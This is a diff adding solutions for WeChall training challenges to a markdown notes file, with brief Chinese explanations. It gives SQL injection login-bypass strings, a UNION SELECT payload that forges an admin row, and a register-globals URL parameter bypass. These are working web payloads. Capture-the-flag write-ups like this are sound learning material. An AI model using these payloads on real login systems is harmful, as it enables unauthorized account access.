@@ -169,3 +169,89 @@ ihipfcngaicd
 
 https://quipqiup.com/
 
+
+
+#### [Training: MySQL I](http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php) ([MySQL](http://www.wechall.net/challs/MySQL), [Exploit](http://www.wechall.net/challs/Exploit), [Training](http://www.wechall.net/challs/Training))
+
+admin' or '1' = '1
+
+```bash
+select * from users where username='admin' or '1'='1' and password='123' or '1'='1
+```
+
+
+
+
+
+#### [Training: MySQL II](http://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php) ([MySQL](http://www.wechall.net/challs/MySQL), [Exploit](http://www.wechall.net/challs/Exploit), [Training](http://www.wechall.net/challs/Training))
+
+
+
+```sql
+mysql> select 1,2,3,4,5,6;
++---+---+---+---+---+---+
+|1  | 2 | 3 | 4 | 5 | 6 |
++---+---+---+---+---+---+
+|1  | 2 | 3 | 4 | 5 | 6 |
++---+---+---+---+---+---+
+
+mysql> select * from users;
++---+---+---+
+|id |usn|pwd|
++---+---+---+
+|1  |xx |122|
+|2  |xx |123|
+|3  |xx |123|
++---+---+---+
+
+mysql> select 1,2,3 from users;
++---+---+---+
+|1  |2  |3  |
++---+---+---+
+|1  |2  |3  |
+|1  |2  |3  |
+|1  |2  |3  |
++---+---+---+
+```
+
+
+
+```php
+$password = md5($password);
+$query = "SELECT * FROM users WHERE username='$username'";
+```
+
+
+
+题目中表格属性为
+
+```
+/* TABLE STRUCTURE
+CREATE TABLE IF NOT EXISTS users (
+userid    INT(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+username  VARCHAR(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
+password  CHAR(32) CHARACTER SET ascii COLLATE ascii_bin NOT NULL
+) ENGINE=myISAM;
+*/
+```
+
+
+
+union会将查找到的结果合并
+
+所以我们需要填充3列
+
+
+
+123' union select 1, 'admin', md5('123');#
+
+123
+
+
+
+#### [Training: Register Globals](http://www.wechall.net/challenge/training/php/globals/index.php) ([Exploit](http://www.wechall.net/challs/Exploit), [PHP](http://www.wechall.net/challs/PHP), [Training](http://www.wechall.net/challs/Training))
+
+?username=admin&password=123&login[0]=admin
+
+
+
